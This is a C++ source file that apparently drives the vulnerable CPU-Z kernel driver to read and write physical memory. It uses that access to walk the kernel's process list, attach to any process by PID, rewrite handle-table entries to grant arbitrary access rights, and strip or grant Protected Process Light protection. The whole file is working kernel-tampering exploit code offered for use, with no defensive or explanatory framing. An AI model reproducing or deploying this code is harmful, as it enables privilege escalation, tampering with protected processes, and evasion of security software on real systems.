#include "Process.h"
#include "CPUZ.h"

PHANDLE_TABLE_ENTRY Process::ExpLookupHandleTableEntryWin7(PHANDLE_TABLE HandleTable, ULONGLONG Handle)
{
	ULONGLONG v2;     // r8@2
	ULONGLONG v3;     // rcx@2
	ULONGLONG v4;     // r8@2
	ULONGLONG result; // rax@4
	ULONGLONG v6;     // [sp+8h] [bp+8h]@1
	ULONGLONG table = (ULONGLONG)HandleTable;

	v6 = Handle;
	v6 = Handle & 0xFFFFFFFC;
	if (v6 >= *(DWORD*)(table + 92)) {
		result = 0i64;
	}
	else {
		v2 = (*(ULONGLONG*)table);
		v3 = (*(ULONGLONG*)table) & 3i64;
		v4 = v2 - (ULONG)v3;
		if ((ULONG)v3) {
			if ((DWORD)v3 == 1)
				result = Read<ULONGLONG>((((Handle - (Handle & 0x3FF)) >> 7) + v4)) + 4 * (Handle & 0x3FF);
			else
				result = Read<ULONGLONG>((PVOID)(Read<ULONGLONG>((PVOID)(((((Handle - (Handle & 0x3FF)) >> 7) - (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF)) >> 9) + v4)) + (((Handle - (Handle & 0x3FF)) >> 7) & 0xFFF))) + 4 * (Handle & 0x3FF);
		}
		else {
			result = v4 + 4 * Handle;
		}
	}
	return (PHANDLE_TABLE_ENTRY)result;
}

PHANDLE_TABLE_ENTRY Process::ExpLookupHandleTableEntry(PHANDLE_TABLE HandleTable, ULONGLONG Handle)
{
	ULONGLONG v2; // rdx@1
	LONGLONG v3; // r8@2
	ULONGLONG result; // rax@4
	ULONGLONG v5;

	ULONGLONG a1 = (ULONGLONG)HandleTable;

	v2 = Handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= *(DWORD*)a1) {
		result = 0i64;
	}
	else {
		v3 = *(ULONGLONG*)(a1 + 8);
		if (*(ULONGLONG*)(a1 + 8) & 3) {
			if ((*(DWORD*)(a1 + 8) & 3) == 1) {
				v5 = Read<ULONGLONG>(v3 + 8 * (v2 >> 10) - 1);
				result = v5 + 4 * (v2 & 0x3FF);
			}
			else {
				v5 = Read<ULONGLONG>(Read<ULONGLONG>(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
				result = v5 + 4 * (v2 & 0x3FF);
			}
		}
		else {
			result = v3 + 4 * v2;
		}
	}
	return (PHANDLE_TABLE_ENTRY)result;
}

Process::Process(CPUZ* cpuz)
{
	this->cpuz = cpuz;
	this->currentContext = nullptr;
	DynData::load_information();
}

bool Process::Read(PVOID base, PVOID buf, size_t len)
{
	if (currentContext == nullptr)
		throw std::runtime_error{ "Not attached to a process." };

	auto phys = cpuz->TranslateLinearAddress(currentContext->dir_base, base);

	if (!phys)
		return false;

	return cpuz->ReadPhysicalAddress(phys, buf, len);
}

bool Process::Write(PVOID base, PVOID buf, size_t len)
{
	if (currentContext == nullptr)
		throw std::runtime_error{ "Not attached to a process." };

	auto phys = cpuz->TranslateLinearAddress(currentContext->dir_base, base);

	if (!phys)
		return false;

	return cpuz->WritePhysicalAddress(phys, buf, len);
}

LPVOID Process::GetKernelBase(PSIZE_T kernelSize) 
{
	NTSTATUS status;
	PVOID buffer;
	ULONG bufferSize = 2048;

	buffer = malloc(bufferSize);

	status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11/*SystemModuleInformation*/, buffer, bufferSize, &bufferSize);

	if (status == STATUS_INFO_LENGTH_MISMATCH) {
		free(buffer);
		buffer = malloc(bufferSize);

		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11/*SystemModuleInformation*/, buffer, bufferSize, &bufferSize);
	}

	if (!NT_SUCCESS(status))
		return NULL;

	if (kernelSize)
		*kernelSize = (SIZE_T)((PRTL_PROCESS_MODULES)buffer)->Modules[0].ImageSize;

	return ((PRTL_PROCESS_MODULES)buffer)->Modules[0].ImageBase;
}

uint8_t* Process::FindKernelProc(const char* name)
{
	static HMODULE ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
	static ULONG64 krnl_base = (ULONG64)GetKernelBase(nullptr);

	if (!krnl_base)
		throw std::runtime_error{ "Could not find the system base." };

	if (!ntoskrnl)
		throw std::runtime_error{ "Failed to load ntoskrnl.exe" };

	auto fn = (std::uint64_t)GetProcAddress(ntoskrnl, name);

	if (!fn) return nullptr;

	return (uint8_t*)(fn - (std::uint64_t)ntoskrnl + krnl_base);
}

ProcessContext Process::FindProcessInfo(uint32_t pid)
{
	ProcessContext info;
	info.pid = 0;

	// 1. Get PsInitialSystemProcess;
	// 2. Iterate _EPROCESS list until UniqueProcessId == pid;
	// 3. Read _KPROCESS:DirectoryTableBase;
	// 4. Profit.

	// Get the pointer to the system process
	// This is a pointer to a EPROCESS object
	auto peprocess = FindKernelProc("PsInitialSystemProcess");
	auto ntos_entry = cpuz->ReadSystemAddress<std::uint64_t>(peprocess);

	auto list_head = ntos_entry + DynData::offset_process_links;
	auto last_link = cpuz->ReadSystemAddress<std::uint64_t>(list_head + sizeof(PVOID));
	auto cur_link = list_head;

	// Iterate the kernel's linked list of processes
	do {
		auto entry = (std::uint64_t)cur_link - DynData::offset_process_links;

		auto unique_pid = cpuz->ReadSystemAddress<std::uint64_t>(entry + DynData::offset_process_id);

		// PID is a match
		// Read the directory table base for this process so we can use it later
		// as well as the address for this EPROCESS entry
		if (unique_pid == pid) {
			info.pid = pid;
			info.dir_base = cpuz->ReadSystemAddress<std::uint64_t>(entry + DynData::offset_directorytable);
			info.kernel_entry = entry;
			break;
		}

		// Go to next process
		cur_link = cpuz->ReadSystemAddress<std::uint64_t>(cur_link);
	} while (cur_link != last_link);

	return info;
}

bool Process::Attach(std::uint32_t pid)
{
	auto info = FindProcessInfo(pid);

	if (info.pid != 0) {
		contextStack.push(info);
		currentContext = &contextStack.top();
		return true;
	}
	return false;
}

void Process::Detach()
{
	contextStack.pop();
	if (contextStack.size() > 0)
		currentContext = &contextStack.top();
	else
		currentContext = nullptr;
}

bool Process::GrantHandleAccess(HANDLE handle, ACCESS_MASK accessRights)
{
	if (currentContext == nullptr)
		throw std::runtime_error{ "Not attached to a process." };

	auto handle_table_addr = Read<PHANDLE_TABLE>(PVOID(currentContext->kernel_entry + DynData::offset_object_table));
	auto handle_table = Read<HANDLE_TABLE>(handle_table_addr);
	auto entry_addr = PHANDLE_TABLE_ENTRY{ nullptr };

	if (DynData::os_version == win7_sp1) {
		entry_addr = ExpLookupHandleTableEntryWin7(&handle_table, (ULONGLONG)handle);
		if (!entry_addr)
			return false;
	}
	else {
		entry_addr = ExpLookupHandleTableEntry(&handle_table, (ULONGLONG)handle);
		if (!entry_addr)
			return false;
	}

	auto entry = Read<HANDLE_TABLE_ENTRY>(entry_addr);
	entry.GrantedAccess = accessRights;
	return Write<HANDLE_TABLE_ENTRY>(entry_addr, entry);
}

bool Process::StripPPL()
{
	if (currentContext == nullptr)
		throw std::runtime_error{ "Not attached to a process." };

	auto entry_addr = currentContext->kernel_entry;
	auto entry_protection_addr = entry_addr + DynData::offset_ps_protection;

	UCHAR value = Read<UCHAR>(entry_protection_addr);

	printf("value %i\n", value);
	UCHAR write = 0;

	Write<UCHAR>(entry_protection_addr, write);

	value = Read<UCHAR>(entry_protection_addr);
	printf("value %i\n", value);
	return true;
}

bool Process::GivePPL()
{
	if (currentContext == nullptr)
		throw std::runtime_error{ "Not attached to a process." };

	auto entry_addr = currentContext->kernel_entry;
	auto entry_protection_addr = entry_addr + DynData::offset_ps_protection;

	UCHAR write = 97;
	Write<UCHAR>(entry_protection_addr, write);

	UCHAR value = Read<UCHAR>(entry_protection_addr);
	printf("value %i\n", value);
	return true;
}